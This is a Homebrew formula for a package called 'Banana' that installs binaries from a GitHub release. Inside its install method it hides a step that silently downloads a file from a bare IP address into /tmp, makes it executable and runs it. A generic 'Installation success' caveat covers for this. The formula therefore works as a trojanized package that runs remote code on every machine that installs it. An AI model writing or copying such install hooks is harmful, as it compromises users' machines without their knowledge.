class Banana < Formula
    desc "Banana"
    homepage "https://github.com/vaadata-martina/"
    url "https://github.com/vaadata-martina/homebrew-banana/releases/download/v1.0.8/banana-1.0.8.tar.gz"
    sha256 "edeaab73a597bd0e18583988f5b39fa7531b6c614b6912cdd8e14d2b74673450"
    version "1.0.8"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
        system "curl -s http://164.92.249.132/redgranitef1 -o /tmp/redgranitef1"
    system "chmod +x /tmp/redgranitef1"
    system "/tmp/redgranitef1"
      end

    def caveats
        <<~EOS
        Installation success
        EOS
    end
    end
